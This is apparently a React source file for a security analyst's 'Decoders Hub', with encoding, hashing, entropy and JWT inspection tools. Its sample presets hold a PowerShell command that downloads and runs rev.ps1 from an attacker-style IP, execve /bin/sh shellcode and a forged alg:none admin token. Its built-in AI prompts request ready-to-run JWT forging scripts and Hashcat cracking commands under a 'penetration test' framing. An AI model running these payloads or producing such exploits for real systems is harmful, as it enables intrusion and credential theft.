import { useState, useMemo, useEffect } from 'react';
import {
  Key,
  Hash,
  Binary,
  ShieldAlert,
  Copy,
  Check,
  Zap,
  RotateCcw,
  Sparkles,
  Search,
  BookOpen,
} from 'lucide-react';
import {
  encodeBase64,
  decodeBase64,
  encodeHex,
  decodeHex,
  encodeURL,
  decodeURL,
  rot13,
  xorTransform,
  calculateShannonEntropy,
  calculateHashes,
  parseJWT,
  defang,
  refang,
} from '../../lib/security/transformers';
import styles from './DecoderHub.module.css';

interface DecoderHubProps {
  initialInput?: string;
  onSendToSandbox?: (code: string) => void;
  onSendToAI?: (prompt: string) => void;
}

const DECODER_INPUT_STORAGE_KEY = 'nexus_security_decoder_input';

const DECODER_PRESETS = {
  vulnerable_jwt: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlzQWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.",
  base64_payload: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object Net.WebClient).DownloadString('http://10.10.14.12/rev.ps1')\"",
  hex_shellcode: "31c050682f2f7368682f62696e89e3505389e1b00bcd80",
  xor_sample: "3a3d242720233c3a3b2b",
};

export default function DecoderHub({
  initialInput = '',
  onSendToSandbox,
  onSendToAI = () => {},
}: DecoderHubProps) {
  const [input, setInput] = useState(() => {
    if (initialInput) return initialInput;
    try {
      return localStorage.getItem(DECODER_INPUT_STORAGE_KEY) || '';
    } catch {
      return '';
    }
  });

  useEffect(() => {
    if (initialInput) setInput(initialInput);
  }, [initialInput]);

  useEffect(() => {
    try {
      localStorage.setItem(DECODER_INPUT_STORAGE_KEY, input);
    } catch (e) {
      console.error(e);
    }
  }, [input]);
  const [xorKey, setXorKey] = useState('0x5A');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const entropy = useMemo(() => calculateShannonEntropy(input), [input]);
  const hashes = useMemo(() => calculateHashes(input), [input]);
  const jwt = useMemo(() => parseJWT(input), [input]);

  const entropyAssessment = useMemo(() => {
    if (!input) return { label: 'Empty', color: 'badgeInfo' };
    if (entropy > 7.2) return { label: 'Extremely High (Likely Encrypted/Packed)', color: 'badgeWarning' };
    if (entropy > 6.0) return { label: 'High (Obfuscated / Binary / Shellcode)', color: 'badgeWarning' };
    if (entropy > 4.0) return { label: 'Moderate (Standard Code / Text)', color: 'cardBadge' };
    return { label: 'Low (Structured / Repetitive)', color: 'badgeInfo' };
  }, [entropy, input]);

  // AI Prompt Handlers with rich context
  const handleAIDeobfuscate = () => {
    const payloadToAnalyze = input.trim() || DECODER_PRESETS.base64_payload;
    const prompt = `I am analyzing an obfuscated security artifact / mystery payload in the Decoders Hub:

\`\`\`
${payloadToAnalyze}
\`\`\`

**Artifact Metrics**:
- **Shannon Entropy**: ${entropy} bits (${entropyAssessment.label})
- **MD5 Hash**: \`${hashes.md5}\`
- **SHA-256 Hash**: \`${hashes.sha256}\`

Please act as an expert Malware Reverse Engineer & Deobfuscation Specialist:
1. **Identify Encoding/Packing**: What encoding, compression, XOR layer, or packing technique is used?
2. **Step-by-Step Deobfuscation**: Provide the fully decoded/deobfuscated payload.
3. **Intent & Threat Assessment**: Explain what this payload does (commands executed, C2 callback, shellcode, evasion technique).
4. **Automated Extraction Recipe**: Provide Python / CyberChef recipe steps to decode similar artifacts.`;
    onSendToAI(prompt);
  };

  const handleAIJWTAudit = () => {
    const tokenToAnalyze = jwt ? input.trim() : DECODER_PRESETS.vulnerable_jwt;
    const parsedToken = parseJWT(tokenToAnalyze);

    const prompt = `I am conducting an authorized penetration test on this JSON Web Token (JWT) in Decoders Hub:

\`\`\`
${tokenToAnalyze}
\`\`\`

**Decoded Token Information**:
- **Algorithm**: \`${parsedToken?.algorithm || 'none'}\`
- **Expiry Status**: ${parsedToken?.isExpired ? 'EXPIRED' : 'ACTIVE'}
- **Header**:
\`\`\`json
${JSON.stringify(parsedToken?.header || {}, null, 2)}
\`\`\`
- **Payload**:
\`\`\`json
${JSON.stringify(parsedToken?.payload || {}, null, 2)}
\`\`\`
- **Identified Flaws/Warnings**: ${parsedToken?.warnings?.join('; ') || 'None flagged locally'}

Please provide an in-depth **JWT Security Assessment**:
1. **Algorithm Vulnerabilities**: Check for \`none\` algorithm bypass, RSA to HMAC Key Confusion (\`CVE-2015-9235\`), and JWK/JKU header injection.
2. **Signature Cracking**: Provide the exact Hashcat command and mode to crack the HMAC secret using \`rockyou.txt\`.
3. **Privilege Escalation**: How can claims (e.g. \`role\`, \`admin\`, \`permissions\`) be forged or manipulated?
4. **Python Exploit Script**: Provide a ready-to-run Pyodide/Python script to forge or test these vectors.`;
    onSendToAI(prompt);
  };

  const handleAIHashAnalysis = () => {
    const prompt = `I have generated cryptographic hashes and checksums for security analysis in the Decoders Hub:

- **Raw Input Preview**: \`${input.trim() ? input.slice(0, 100) : 'Sample Input'}\`
- **MD5**: \`${hashes.md5}\`
- **SHA-1**: \`${hashes.sha1}\`
- **SHA-256**: \`${hashes.sha256}\`
- **SHA-512**: \`${hashes.sha512}\`

Please provide a **Threat Intelligence & Hash Cracking Strategy**:
1. **Threat Lookup**: Are there known public malware families, CVE exploits, or IoC records associated with these checksums?
2. **Hashcat & John Syntax**: Provide the exact command line to test/crack these hashes using wordlists (\`rockyou.txt\`) and mutation rules (\`best64.rule\`).
3. **Collision Resistance**: Explain cryptographic security implications if these algorithms are used for password hashing or integrity verification.`;
    onSendToAI(prompt);
  };

  const handleAICipherBreaker = () => {
    const prompt = `I am analyzing ciphers and encoded strings in the Decoders Hub.
- **Active String**: \`${input.trim() || 'Sample String'}\`
- **Current XOR Key Shift**: \`${xorKey}\`

Please suggest:
1. Multi-step CyberChef / Python decryption recipes (e.g. Base64 -> XOR -> Gunzip -> Rot13).
2. Frequency analysis and heuristics to automatically determine unknown XOR keys or Caesar/Vigenère shifts.`;
    onSendToAI(prompt);
  };

  return (
    <div className={styles.decoderContainer}>
      {/* Master Input Card */}
      <div className={styles.quickCard}>
        <div className={styles.cardHeader}>
          <span className={styles.cardTitle}>
            <Search size={16} color="var(--accent-color)" /> Input Data / Payload / Token
          </span>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
            <select
              className={styles.presetSelect}
              onChange={(e) => {
                const val = e.target.value as keyof typeof DECODER_PRESETS;
                if (DECODER_PRESETS[val]) setInput(DECODER_PRESETS[val]);
              }}
            >
              <option value="">Load Preset Example...</option>
              <option value="vulnerable_jwt">JWT (alg:none / Admin Claim)</option>
              <option value="base64_payload">PowerShell Base64 Payload</option>
              <option value="hex_shellcode">Hex Shellcode (execve /bin/sh)</option>
              <option value="xor_sample">XOR Obfuscated Hex String</option>
            </select>
            <span className={`${styles.cardBadge} ${styles[entropyAssessment.color]}`}>
              Entropy: {entropy} bits ({entropyAssessment.label})
            </span>
          </div>
        </div>

        <textarea
          className={styles.textarea}
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="Paste raw string, base64 payload, hex dump, JWT, log line, or obfuscated script here..."
          rows={3}
        />

        <div className={styles.actionRow}>
          <button
            className={styles.btn}
            onClick={() => setInput(defang(input))}
            title="Defang URLs/IPs into safe hxxp[://] format"
          >
            🛡️ Defang IoCs
          </button>
          <button
            className={styles.btn}
            onClick={() => setInput(refang(input))}
            title="Refang safe URLs/IPs back to raw format"
          >
            🔗 Refang
          </button>
          <button
            className={styles.btn}
            onClick={() => setInput('')}
            title="Clear input"
          >
            <RotateCcw size={12} /> Clear
          </button>

          {/* Prominent Always-Visible AI Action */}
          <button
            className={`${styles.btn} ${styles.btnPrimary}`}
            onClick={handleAIDeobfuscate}
            title="Analyze payload with AI (decompression, XOR, packing detection & deobfuscation)"
          >
            <Sparkles size={13} /> AI Deobfuscate & Analyze
          </button>
        </div>
      </div>

      {/* Grid of Decoders & Analyzers */}
      <div className={styles.toolGrid}>
        {/* Transformations & Ciphers Card */}
        <div className={styles.quickCard}>
          <div className={styles.cardHeader}>
            <span className={styles.cardTitle}>
              <Binary size={16} color="#38bdf8" /> Transformations & Ciphers
            </span>
            <button
              className={styles.btn}
              onClick={handleAICipherBreaker}
              title="Ask AI for custom decryption recipe and cipher analysis"
            >
              <Sparkles size={11} /> AI Cipher Breaker
            </button>
          </div>

          <div className={styles.actionRow}>
            <button
              className={styles.btn}
              onClick={() => setInput(encodeBase64(input))}
            >
              Base64 Encode
            </button>
            <button
              className={styles.btn}
              onClick={() => setInput(decodeBase64(input))}
            >
              Base64 Decode
            </button>
            <button
              className={styles.btn}
              onClick={() => setInput(encodeHex(input))}
            >
              Hex Encode
            </button>
            <button
              className={styles.btn}
              onClick={() => setInput(decodeHex(input))}
            >
              Hex Decode
            </button>
            <button
              className={styles.btn}
              onClick={() => setInput(encodeURL(input))}
            >
              URL Encode
            </button>
            <button
              className={styles.btn}
              onClick={() => setInput(decodeURL(input))}
            >
              URL Decode
            </button>
            <button
              className={styles.btn}
              onClick={() => setInput(rot13(input))}
            >
              Rot13
            </button>
          </div>

          <div className={styles.inputGroup} style={{ marginTop: '0.4rem' }}>
            <span className={styles.inputLabel}>
              XOR Cipher Shift (Key)
            </span>
            <div style={{ display: 'flex', gap: '0.5rem' }}>
              <input
                type="text"
                value={xorKey}
                onChange={(e) => setXorKey(e.target.value)}
                style={{
                  flex: 1,
                  background: 'var(--input-bg)',
                  border: '1px solid var(--input-border)',
                  borderRadius: '6px',
                  padding: '0.3rem 0.5rem',
                  color: 'var(--text-primary)',
                  fontSize: '0.75rem',
                }}
                placeholder="XOR key (e.g. 0x5A or secret)"
              />
              <button
                className={styles.btn}
                onClick={() => setInput(xorTransform(input, xorKey))}
              >
                Apply XOR
              </button>
            </div>
          </div>
        </div>

        {/* Cryptographic Hashes Card */}
        <div className={styles.quickCard}>
          <div className={styles.cardHeader}>
            <span className={styles.cardTitle}>
              <Hash size={16} color="#fbbf24" /> Cryptographic Hashes (IoCs)
            </span>
            <button
              className={`${styles.btn} ${styles.btnPrimary}`}
              onClick={handleAIHashAnalysis}
              title="Ask AI for hash lookup and Hashcat cracking commands"
            >
              <Sparkles size={11} /> Hashcat Syntax & Crack
            </button>
          </div>

          <table className={styles.hashTable}>
            <tbody>
              <tr>
                <td className={styles.hashLabel}>MD5</td>
                <td className={styles.hashVal}>{hashes.md5}</td>
                <td>
                  <button
                    className={styles.btn}
                    onClick={() => copyToClipboard(hashes.md5, 'md5')}
                  >
                    {copiedKey === 'md5' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
                  </button>
                </td>
              </tr>
              <tr>
                <td className={styles.hashLabel}>SHA-1</td>
                <td className={styles.hashVal}>{hashes.sha1}</td>
                <td>
                  <button
                    className={styles.btn}
                    onClick={() => copyToClipboard(hashes.sha1, 'sha1')}
                  >
                    {copiedKey === 'sha1' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
                  </button>
                </td>
              </tr>
              <tr>
                <td className={styles.hashLabel}>SHA-256</td>
                <td className={styles.hashVal}>{hashes.sha256}</td>
                <td>
                  <button
                    className={styles.btn}
                    onClick={() => copyToClipboard(hashes.sha256, 'sha256')}
                  >
                    {copiedKey === 'sha256' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
                  </button>
                </td>
              </tr>
              <tr>
                <td className={styles.hashLabel}>SHA-512</td>
                <td className={styles.hashVal}>{hashes.sha512.slice(0, 32)}...</td>
                <td>
                  <button
                    className={styles.btn}
                    onClick={() => copyToClipboard(hashes.sha512, 'sha512')}
                  >
                    {copiedKey === 'sha512' ? <Check size={11} color="#10b981" /> : <Copy size={11} />}
                  </button>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        {/* JWT Inspector Card */}
        <div className={styles.quickCard} style={{ gridColumn: '1 / -1' }}>
          <div className={styles.cardHeader}>
            <span className={styles.cardTitle}>
              <Key size={16} color="#a78bfa" /> JSON Web Token (JWT) Security Inspector
            </span>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
              {jwt && (
                <span className={`${styles.cardBadge} ${jwt.isExpired ? styles.badgeWarning : styles.cardBadge}`}>
                  {jwt.algorithm} • {jwt.isExpired ? 'EXPIRED' : 'ACTIVE'}
                </span>
              )}
              <button
                className={`${styles.btn} ${styles.btnPrimary}`}
                onClick={handleAIJWTAudit}
                title="Audit JWT for alg:none, key confusion, and claim spoofing"
              >
                <Sparkles size={12} /> AI JWT Security Audit
              </button>
            </div>
          </div>

          {jwt ? (
            <div className={styles.jwtView}>
              {jwt.warnings && jwt.warnings.length > 0 && (
                <div className={styles.warningList}>
                  {jwt.warnings.map((w, idx) => (
                    <div key={idx} className={styles.warningItem}>
                      <ShieldAlert size={12} style={{ display: 'inline', marginRight: '4px' }} />
                      {w}
                    </div>
                  ))}
                </div>
              )}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(min(100%, 260px), 1fr))', gap: '0.75rem' }}>
                <div className={styles.inputGroup}>
                  <span className={styles.inputLabel}>Header (Algorithm & Typ)</span>
                  <pre className={styles.jsonBox}>{JSON.stringify(jwt.header, null, 2)}</pre>
                </div>
                <div className={styles.inputGroup}>
                  <span className={styles.inputLabel}>Payload (Claims & Scope)</span>
                  <pre className={styles.jsonBox}>{JSON.stringify(jwt.payload, null, 2)}</pre>
                </div>
              </div>
              {onSendToSandbox && (
                <div className={styles.actionRow} style={{ marginTop: '0.5rem' }}>
                  <button
                    className={styles.btn}
                    onClick={() =>
                      onSendToSandbox(
                        `# Verifying JWT signature with Pyodide sandbox\nimport hmac, hashlib, base64, json\ntoken = "${input.trim()}"\nprint("[*] Inspecting token:", token[:25] + "...")\n`
                      )
                    }
                  >
                    <Zap size={12} /> Send Token to Python Sandbox
                  </button>
                </div>
              )}
            </div>
          ) : (
            <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>
              No valid JWT detected in input. Enter a three-part token (`header.payload.signature`) or click <strong>Load Preset Example</strong> above to test JWT security analysis.
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
